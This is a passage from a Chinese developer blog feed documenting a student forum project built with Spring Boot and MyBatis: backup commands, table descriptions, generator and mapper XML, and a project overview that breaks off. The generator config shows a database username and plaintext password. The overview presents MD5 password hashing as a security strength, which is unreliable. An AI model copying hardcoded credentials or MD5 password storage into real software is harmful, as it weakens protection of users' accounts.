class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sh复制代码# 备份整个数据库</span><br><span class="line">mysqldump -u username -p database_name &gt; /path/to/backup/backup.sql</span><br><span class="line"></span><br><span class="line"># 备份所有数据库</span><br><span class="line">mysqldump -u username -p --all-databases &gt; /path/to/backup/all_databases.sql</span><br></pre></td></tr></table></figure><h3 id=""></h3><h4 id="管理工具">管理工具</h4><p>在管理数据库的选择上，选择的是Navicat，可以有效的管理数据库。</p><h4 id="sql文件">sql文件</h4><p><strong>包含了创建名为<code>tb_bbs_post</code>的MySQL表的结构。这个表用于存储论坛帖子的相关信息。每个帖子有一个唯一的主键<code>post_id</code>，以及发布者ID、帖子标题、内容等字段。</strong></p><p><strong>创建了名为tb_bbs_post的mysql表，用于存储帖子user的相关内容：</strong></p><ul><li><strong>存储用户信息，包括登录名、密码、昵称、头像等。</strong></li><li><strong>每个用户有一个唯一的主键<code>user_id</code>。</strong></li><li><strong><code>login_name</code>字段用于用户登录，<code>password_md5</code>字段存储密码的MD5加密值。</strong></li><li><strong><code>user_status</code>字段表示用户状态，0表示正常，1表示禁言；<code>is_admin</code>字段表示用户是否为管理员。</strong></li><li><strong><code>last_login_time</code>字段记录用户最后登录时间，<code>create_time</code>字段记录用户注册时间。</strong></li></ul><p><strong>创建了名为tb_bbs_post的mysql表，用于存储帖子的post的内容</strong></p><p><code>tb_post_category</code>：</p><ul><li><p><strong>存储帖子分类信息，包括分类名称和排序值。</strong></p></li><li><p><strong>每个分类有一个唯一的主键<code>category_id</code>。</strong></p></li><li><p><strong><code>category_name</code>字段存储分类名称，<code>category_rank</code>字段表示分类的排序值。</strong></p></li><li><p><strong><code>is_deleted</code>字段表示分类是否被删除，0表示未删除，1表示已删除。</strong></p></li><li><p><strong><code>create_time</code>字段记录分类创建时间。</strong></p></li><li><p><code>tb_post_collect_record</code>：</p><ul><li><strong>存储帖子收藏记录，包括帖子ID和用户ID。</strong></li><li><strong>每条记录有一个唯一的主键<code>record_id</code>。</strong></li><li><strong><code>post_id</code>字段表示收藏的帖子ID，<code>user_id</code>字段表示收藏者的用户ID。</strong></li><li><strong><code>create_time</code>字段记录收藏记录的创建时间。</strong></li></ul><p><code>tb_post_comment</code>：</p><ul><li><strong>存储帖子评论信息，包括帖子ID、评论者ID、评论内容等。</strong></li><li><strong>每条评论有一个唯一的主键<code>comment_id</code>。</strong></li><li><strong><code>post_id</code>字段表示评论所属的帖子ID，<code>comment_user_id</code>字段表示评论者的用户ID。</strong></li><li><strong><code>comment_body</code>字段存储评论内容，<code>parent_comment_user_id</code>字段表示所回复的上一级评论的用户ID。</strong></li><li><code>comment_create_time</code>字段记录评论的创建时间，<code>is_deleted</code>字段表示评论是否被删除。</li></ul></li></ul><h4 id="交互">交互</h4><p>my_bbs_dbMapper.xml文件用来定义与数据库交互的SQL映射</p><p>其中的这个<code>resultMap</code>定义了数据库表到Java对象的映射关系。每个<code>&lt;result&gt;</code>标签指定了数据库列（<code>column</code>）与Java对象属性（<code>property</code>）之间的映射关系，以及列的JDBC类型（<code>jdbcType</code>）。这个<code>resultMap</code>扩展了<code>BaseResultMap</code>，添加了对大文本（BLOB）的支持，映射了<code>post_content</code>列。这个SQL片段定义了一个动态生成的<code>WHERE</code>子句，用于根据条件动态构建查询语句。<code>&lt;foreach&gt;</code>、<code>&lt;if&gt;</code>、<code>&lt;choose&gt;</code>等标签用来遍历条件并生成相应的SQL语句。这个SQL片段与<code>Example_Where_Clause</code>类似，但用于更新操作中的<code>WHERE</code>子句。<code>Base_Column_List</code> 和 <code>Blob_Column_List</code> 定义了基础列和BLOB列的列表，用于复用。</p><p><code>selectByExampleWithBLOBs</code> 和 <code>selectByExample</code> 定义了查询方法，分别用于查询包含BLOB列和不包含BLOB列的数据。</p><p>这些查询方法根据参数动态生成SQL语句，包括<code>distinct</code>、<code>WHERE</code>子句和<code>ORDER BY</code>子句。</p><ul><li><code>selectByExample</code> 和 <code>selectByPrimaryKey</code> 定义了查询方法，分别用于根据条件和主键查询数据。</li><li><code>deleteByPrimaryKey</code> 和 <code>deleteByExample</code> 定义了删除方法，分别用于根据主键和条件删除数据。</li><li><code>insert</code> 和 <code>insertSelective</code> 定义了插入方法，分别用于插入完整记录和选择性插入记录。</li><li><code>countByExample</code> 用于根据条件统计记录数量。</li></ul><p>这些SQL映射定义了与数据库表<code>tb_bbs_post</code>的基本CRUD操作，利用MyBatis动态生成SQL语句，提高了代码的灵活性和可维护性。</p><p><code>countByExample</code> 用于根据条件统计记录数量。</p><p><code>updateByExampleSelective</code> 用于根据条件选择性地更新记录。</p><p><code>updateByExampleWithBLOBs</code> 和 <code>updateByExample</code> 用于根据条件更新记录，分别包括和不包括BLOB字段。</p><p><code>updateByPrimaryKeySelective</code> 和 <code>updateByPrimaryKeyWithBLOBs</code> 用于根据主键更新记录，分别选择性更新和更新所有字段。<code>update</code>方法更新所有字段，包括<code>post_content</code>。</p><p><code>updateByPrimaryKey</code>方法更新所有字段，但不包括<code>post_content</code>。</p><p>这两个更新操作都是根据主键<code>post_id</code>进行的。</p><p>在这个文件中mybatisGeneratorConfig.xml用于生成与MyBatis ORM框架一起使用的Java对象和Mapper文件。根节点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xml</span><br><span class="line">复制代码</span><br><span class="line">&lt;generatorConfiguration&gt;</span><br></pre></td></tr></table></figure><ul><li>表示MyBatis Generator的配置文件开始。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xml</span><br><span class="line">复制代码</span><br><span class="line">&lt;context id=&quot;DB2Tables&quot; targetRuntime=&quot;MyBatis3&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><code>id</code>：上下文的标识符。</li><li><code>targetRuntime</code>：指定生成代码的运行时环境，<code>MyBatis3</code>表示生成MyBatis 3.x兼容代码。</li></ul><h5 id="数据库连接配置">数据库连接配置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;jdbcConnection driverClass=&quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">    connectionURL=&quot;jdbc:mysql://localhost:3306/my_bbs_db?serverTimezone=UTC&quot;</span><br><span class="line">    userId=&quot;mengnankk&quot;</span><br><span class="line">    password=&quot;Zyk2215290444&quot;&gt;</span><br><span class="line">&lt;/jdbcConnection&gt;</span><br></pre></td></tr></table></figure><ul><li><code>driverClass</code>：JDBC驱动类名。</li><li><code>connectionURL</code>：数据库连接URL。</li><li><code>userId</code>：数据库用户名。</li><li><code>password</code>：数据库密码。</li></ul><h5 id="Java类型解析器">Java类型解析器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;javaTypeResolver&gt;</span><br><span class="line">    &lt;property name=&quot;forceBigDecimals&quot; value=&quot;false&quot;/&gt;</span><br><span class="line">&lt;/javaTypeResolver&gt;</span><br></pre></td></tr></table></figure><ul><li>用于解析数据库类型到Java类型。</li><li><code>forceBigDecimals</code>：设置为<code>false</code>表示不强制使用<code>BigDecimal</code>类型。</li></ul><h5 id="Java模型生成器">Java模型生成器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;javaModelGenerator targetPackage=&quot;com.my.bbs&quot;</span><br><span class="line">                    targetProject=&quot;src/main/java&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot;/&gt;</span><br><span class="line">&lt;/javaModelGenerator&gt;</span><br></pre></td></tr></table></figure><ul><li><code>targetPackage</code>：生成的模型类包名。</li><li><code>targetProject</code>：生成的模型类文件所在的项目路径。</li><li><code>enableSubPackages</code>：设置为<code>true</code>表示支持子包。</li><li><code>trimStrings</code>：设置为<code>true</code>表示自动去除字符串两端的空格。</li></ul><h5 id="SQL映射文件生成器">SQL映射文件生成器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;sqlMapGenerator targetPackage=&quot;com.my.bbs&quot;</span><br><span class="line">                 targetProject=&quot;src/main/resources&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt;</span><br><span class="line">&lt;/sqlMapGenerator&gt;</span><br></pre></td></tr></table></figure><ul><li><code>targetPackage</code>：生成的SQL映射文件包名。</li><li><code>targetProject</code>：生成的SQL映射文件所在的项目路径。</li><li><code>enableSubPackages</code>：设置为<code>true</code>表示支持子包。</li></ul><h5 id="Java客户端生成器">Java客户端生成器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;javaClientGenerator type=&quot;XMLMAPPER&quot;</span><br><span class="line">                     targetPackage=&quot;com.my.bbs&quot;</span><br><span class="line">                     targetProject=&quot;src/main/java&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt;</span><br><span class="line">&lt;/javaClientGenerator&gt;</span><br></pre></td></tr></table></figure><ul><li><code>type</code>：指定生成的Java客户端类型，<code>XMLMAPPER</code>表示生成XML映射文件的Mapper接口。</li><li><code>targetPackage</code>：生成的Mapper接口包名。</li><li><code>targetProject</code>：生成的Mapper接口所在的项目路径。</li><li><code>enableSubPackages</code>：设置为<code>true</code>表示支持子包。</li></ul><h5 id="指定生成的表及对应的实体类">指定生成的表及对应的实体类</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;table tableName=&quot;tb_bbs_user&quot; domainObjectName=&quot;my_bbs_db&quot;/&gt;</span><br><span class="line">&lt;table tableName=&quot;tb_bbs_post&quot; domainObjectName=&quot;my_bbs_db&quot;/&gt;</span><br></pre></td></tr></table></figure><ul><li><code>tableName</code>：指定数据库中的表名。</li><li><code>domainObjectName</code>：指定生成的实体类名。</li></ul><p>这个配置文件通过指定数据库连接、模型生成器、SQL映射文件生成器和Java客户端生成器等信息，生成与<code>tb_bbs_user</code>和<code>tb_bbs_post</code>表相关的Java对象和MyBatis Mapper文件。你可以添加更多的<code>&lt;table&gt;</code>节点来生成其他表的映射。</p><h4 id="datemapper">datemapper</h4><h5 id="BBSPostCategory">BBSPostCategory</h5><h6 id="根节点">根节点</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xml</span><br><span class="line">复制代码</span><br><span class="line">&lt;mapper namespace=&quot;com.my.bbs.dao.BBSPostCategoryMapper&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>定义了该Mapper文件的命名空间，通常是对应的DAO接口的全限定名。</li></ul><h6 id="ResultMap">ResultMap</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    &lt;id column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt;</span><br><span class="line">    &lt;result column=&quot;category_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryName&quot; /&gt;</span><br><span class="line">    &lt;result column=&quot;category_rank&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryRank&quot; /&gt;</span><br><span class="line">    &lt;result column=&quot;is_deleted&quot; jdbcType=&quot;TINYINT&quot; property=&quot;isDeleted&quot; /&gt;</span><br><span class="line">    &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt;</span><br><span class="line">&lt;/resultMap&gt;</span><br></pre></td></tr></table></figure><ul><li>定义了<code>BBSPostCategory</code>实体类与数据库表<code>tb_post_category</code>的映射关系。</li></ul><h6 id="SQL片段">SQL片段</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;sql id=&quot;Base_Column_List&quot;&gt;</span><br><span class="line">    category_id, category_name, category_rank, is_deleted, create_time</span><br><span class="line">&lt;/sql&gt;</span><br></pre></td></tr></table></figure><ul><li>定义了一个可重用的SQL片段，包含所有的列名。</li></ul><h6 id="-2"></h6><h6 id="根据主键查询">根据主键查询</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;select id=&quot;selectByPrimaryKey&quot; parameterType=&quot;java.lang.Integer&quot; resultMap=&quot;BaseResultMap&quot;&gt;</span><br><span class="line">    select </span><br><span class="line">    &lt;include refid=&quot;Base_Column_List&quot; /&gt;</span><br><span class="line">    from tb_post_category</span><br><span class="line">    where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><ul><li>根据<code>category_id</code>查询对应的记录。</li></ul><h6 id="查询所有未删除的类别">查询所有未删除的类别</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;select id=&quot;getBBSPostCategories&quot; resultMap=&quot;BaseResultMap&quot;&gt;</span><br><span class="line">    select</span><br><span class="line">    &lt;include refid=&quot;Base_Column_List&quot; /&gt;</span><br><span class="line">    from tb_post_category</span><br><span class="line">    where is_deleted = 0 order by category_rank desc</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><ul><li>查询所有<code>is_deleted</code>字段为<code>0</code>的记录，并按<code>category_rank</code>降序排列。</li></ul><h6 id="删除操作">删除操作</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;delete id=&quot;deleteByPrimaryKey&quot; parameterType=&quot;java.lang.Integer&quot;&gt;</span><br><span class="line">    delete from tb_post_category</span><br><span class="line">    where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;</span><br><span class="line">&lt;/delete&gt;</span><br></pre></td></tr></table></figure><ul><li>根据<code>category_id</code>删除对应的记录。</li></ul><h6 id="全字段插入">全字段插入</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;insert id=&quot;insert&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    insert into tb_post_category (category_id, category_name, category_rank, </span><br><span class="line">      is_deleted, create_time)</span><br><span class="line">    values (#&#123;categoryId,jdbcType=INTEGER&#125;, #&#123;categoryName,jdbcType=VARCHAR&#125;, #&#123;categoryRank,jdbcType=INTEGER&#125;, </span><br><span class="line">      #&#123;isDeleted,jdbcType=TINYINT&#125;, #&#123;createTime,jdbcType=TIMESTAMP&#125;)</span><br><span class="line">&lt;/insert&gt;</span><br></pre></td></tr></table></figure><ul><li>插入一条新的记录，所有字段都必须提供值。</li></ul><h6 id="选择性插入">选择性插入</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;insert id=&quot;insertSelective&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    insert into tb_post_category</span><br><span class="line">    &lt;trim prefix=&quot;(&quot; suffix=&quot;)&quot; suffixOverrides=&quot;,&quot;&gt;</span><br><span class="line">      &lt;if test=&quot;categoryId != null&quot;&gt;</span><br><span class="line">        category_id,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryName != null&quot;&gt;</span><br><span class="line">        category_name,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryRank != null&quot;&gt;</span><br><span class="line">        category_rank,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;isDeleted != null&quot;&gt;</span><br><span class="line">        is_deleted,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;createTime != null&quot;&gt;</span><br><span class="line">        create_time,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">    &lt;/trim&gt;</span><br><span class="line">    &lt;trim prefix=&quot;values (&quot; suffix=&quot;)&quot; suffixOverrides=&quot;,&quot;&gt;</span><br><span class="line">      &lt;if test=&quot;categoryId != null&quot;&gt;</span><br><span class="line">        #&#123;categoryId,jdbcType=INTEGER&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryName != null&quot;&gt;</span><br><span class="line">        #&#123;categoryName,jdbcType=VARCHAR&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryRank != null&quot;&gt;</span><br><span class="line">        #&#123;categoryRank,jdbcType=INTEGER&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;isDeleted != null&quot;&gt;</span><br><span class="line">        #&#123;isDeleted,jdbcType=TINYINT&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;createTime != null&quot;&gt;</span><br><span class="line">        #&#123;createTime,jdbcType=TIMESTAMP&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">    &lt;/trim&gt;</span><br><span class="line">  &lt;/insert&gt;</span><br></pre></td></tr></table></figure><ul><li>仅插入有值的字段。</li></ul><h6 id="-3"></h6><h6 id="选择性更新">选择性更新</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;update id=&quot;updateByPrimaryKeySelective&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    update tb_post_category</span><br><span class="line">    &lt;set&gt;</span><br><span class="line">      &lt;if test=&quot;categoryName != null&quot;&gt;</span><br><span class="line">        category_name = #&#123;categoryName,jdbcType=VARCHAR&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;categoryRank != null&quot;&gt;</span><br><span class="line">        category_rank = #&#123;categoryRank,jdbcType=INTEGER&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;isDeleted != null&quot;&gt;</span><br><span class="line">        is_deleted = #&#123;isDeleted,jdbcType=TINYINT&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">      &lt;if test=&quot;createTime != null&quot;&gt;</span><br><span class="line">        create_time = #&#123;createTime,jdbcType=TIMESTAMP&#125;,</span><br><span class="line">      &lt;/if&gt;</span><br><span class="line">    &lt;/set&gt;</span><br><span class="line">    where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;</span><br><span class="line">  &lt;/update&gt;</span><br></pre></td></tr></table></figure><ul><li>仅更新有值的字段。</li></ul><h6 id="全字段更新">全字段更新</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xml复制代码&lt;update id=&quot;updateByPrimaryKey&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt;</span><br><span class="line">    update tb_post_category</span><br><span class="line">    set category_name = #&#123;categoryName,jdbcType=VARCHAR&#125;,</span><br><span class="line">      category_rank = #&#123;categoryRank,jdbcType=INTEGER&#125;,</span><br><span class="line">      is_deleted = #&#123;isDeleted,jdbcType=TINYINT&#125;,</span><br><span class="line">      create_time = #&#123;createTime,jdbcType=TIMESTAMP&#125;</span><br><span class="line">    where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;</span><br><span class="line">  &lt;/update&gt;</span><br></pre></td></tr></table></figure><h4 id="MyBatis-Mapper">MyBatis Mapper</h4><p>好的，我们直接来分析这个MyBatis Mapper文件的功能和结构，而不再打印具体代码。</p><ol><li><p><strong>ResultMap</strong>:</p><ul><li>定义了实体类与数据库表的映射关系。<code>BaseResultMap</code> 映射 <code>record_id</code>, <code>post_id</code>, <code>user_id</code>, <code>create_time</code> 到实体类的相应属性。</li></ul></li><li><p><strong>Base_Column_List</strong>:</p><ul><li>定义了表中的列，以便在SQL查询中复用，减少重复代码。</li></ul></li><li><p><strong>selectByPrimaryKey</strong>:</p><ul><li>通过主键 <code>record_id</code> 查询记录，返回单条记录映射到 <code>BBSPostCollect</code> 实体类。</li></ul></li><li><p><strong>selectByUserIdAndPostId</strong>:</p><ul><li>根据 <code>user_id</code> 和 <code>post_id</code> 查询单条记录，用于检查特定用户是否收藏了特定帖子。</li></ul></li><li><p><strong>listByUserId</strong>:</p><ul><li>根据 <code>user_id</code> 查询用户收藏的所有帖子，返回结果列表映射到 <code>BBSPostCollect</code> 实体类。</li></ul></li><li><p><strong>deleteByPrimaryKey</strong>:</p><ul><li>根据主键 <code>record_id</code> 删除记录。</li></ul></li><li><p><strong>insert</strong>:</p><ul><li>插入一条新的收藏记录，所有字段必须有值。</li></ul></li><li><p><strong>insertSelective</strong>:</p><ul><li>插入一条新的收藏记录，允许部分字段为空，只插入非空字段。</li></ul></li><li><p><strong>updateByPrimaryKeySelective</strong>:</p><ul><li>更新一条记录，根据主键 <code>record_id</code> 更新非空字段。</li></ul></li><li><p><strong>updateByPrimaryKey</strong>:</p><ul><li>更新一条记录，根据主键 <code>record_id</code> 更新所有字段。</li></ul></li></ol><p>这个MyBatis Mapper文件定义了与 <code>BBSPostCollect</code> 实体类相关的数据库操作，具体包括查询、插入、更新和删除操作。它使用了 <code>ResultMap</code> 映射数据库表 <code>tb_post_collect_record</code> 的列与实体类属性之间的关系，并通过 <code>Base_Column_List</code> 片段复用列定义。</p><p>主要功能包括：</p><ul><li><strong>selectByPrimaryKey</strong>：根据主键 <code>record_id</code> 查询记录。</li><li><strong>selectByUserIdAndPostId</strong>：根据 <code>user_id</code> 和 <code>post_id</code> 查询单条记录，用于检查特定用户是否收藏了特定帖子。</li><li><strong>listByUserId</strong>：根据 <code>user_id</code> 查询用户收藏的所有帖子。</li><li><strong>deleteByPrimaryKey</strong>：根据主键 <code>record_id</code> 删除记录。</li><li><strong>insert</strong>：插入一条新的收藏记录，所有字段必须有值。</li><li><strong>insertSelective</strong>：插入一条新的收藏记录，允许部分字段为空。</li><li><strong>updateByPrimaryKeySelective</strong>：根据主键 <code>record_id</code> 更新非空字段。</li><li><strong>updateByPrimaryKey</strong>：根据主键 <code>record_id</code> 更新所有字段。</li></ul><p>通过这些定义，可以实现对 <code>tb_post_collect_record</code> 表的基本CRUD操作，并且可以根据不同的条件进行查询和更新。</p><p>用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。</p><p>用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。</p><h4 id="BBSPostCommentMapper-xml">BBSPostCommentMapper.xml</h4><p>用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。</p><h4 id="BBSPostMapper-xml">BBSPostMapper.xml</h4><p>这个 XML 文件是用于 MyBatis 的数据库映射配置，它定义了与帖子相关的数据库操作，主要包括：</p><ul><li><p><strong>结果映射（ResultMap）</strong>：定义了两个结果映射，<code>BaseResultMap</code> 和 <code>ResultMapWithBLOBs</code>，用于将数据库查询结果映射到实体类 <code>BBSPost</code> 的属性。</p></li><li><p><strong>SQL 片段（SQL Fragments）</strong>：定义了两个 SQL 片段，<code>Base_Column_List</code> 和 <code>Blob_Column_List</code>，用于在查询语句中引用基本列和长文本列。</p></li><li><p><strong>查询操作（Select Statements）</strong>：包括根据帖子ID查询帖子详细信息、根据一组帖子ID查询帖子列表、获取近一周内热门帖子列表、根据条件查询帖子列表和获取特定用户的帖子列表等。</p></li><li><p><strong>插入、更新和删除操作（Insert, Update, Delete Statements）</strong>：定义了插入帖子、更新帖子信息和删除帖子等数据库操作。</p></li></ul><p>BBSUserMapper.xml</p><p>XML 文件是用于 MyBatis 的数据库映射配置，定义了与用户管理相关的数据库操作，主要包括：</p><ul><li><strong>结果映射（ResultMap）</strong>：定义了一个结果映射 <code>BaseResultMap</code>，用于将数据库查询结果映射到实体类 <code>BBSUser</code> 的属性。</li><li><strong>SQL 片段（SQL Fragments）</strong>：定义了一个 SQL 片段 <code>Base_Column_List</code>，用于在查询语句中引用基本列。</li><li><strong>查询操作（Select Statements）</strong>：包括根据用户ID查询用户详细信息、根据一组用户ID查询用户列表、根据登录名查询用户信息以及根据登录名和密码查询用户信息等。</li><li><strong>插入、更新和删除操作（Insert, Update, Delete Statements）</strong>：定义了插入用户、更新用户信息和删除用户等数据库操作。</li><li>联系我：<img src="https://skymirror-1322372781.cos.ap-beijing.myqcloud.com/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240131170643.jpg" alt=""></li></ul>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BBS项目设计</title>
      <link href="/2024/06/06/webbbs/"/>
      <url>/2024/06/06/webbbs/</url>
      
        <content type="html"><![CDATA[<ul><li><h1>学校学习交流论坛</h1></li><li><h2 id="1-项目简介">1. 项目简介</h2></li><li><p>项目名称：学校学习交流论坛</p></li><li><p>项目描述：本项目旨在创建一个功能全面、易于使用的在线论坛系统，用户可以注册、登录、发布帖子、评论、收藏以及查看热门话题。该系统采用 Spring Boot 框架进行开发，确保系统的高性能和可扩展性。</p></li><li><h2 id="2-项目采用技术">2. 项目采用技术</h2></li><li><p>编程语言：JAVA HTML JavaScript CSS</p></li><li><p>框架和库：Spring Boot</p></li><li><p>数据库：8.0.37 MySQL Community Server</p></li><li><p>开发工具：IDEA2024.1</p></li><li><p>其他技术：Navicat  Maven Git Github</p></li><li><h2 id="3-功能需求分析">3. 功能需求分析</h2></li><li><p>用户注册与登录</p></li><li><p>个人资料管理</p></li><li><p>发布帖子和评论</p></li><li><p>帖子收藏</p></li><li><p>查看热门话题</p></li><li><h2 id="4-项目亮点">4. 项目亮点</h2></li><li><p>高性能：通过 Spring Boot 框架实现高效的请求处理。</p></li><li><p>易扩展性：模块化设计，便于功能扩展。</p></li><li><p>安全性：采用 MD5 加密用户密码，保障用户信息安全。</p></li><li><p>数据分析：提供帖子浏览量、评论量的统计功能，便于数据分析。</p></li><li><h2 id="5-系统演示">5. 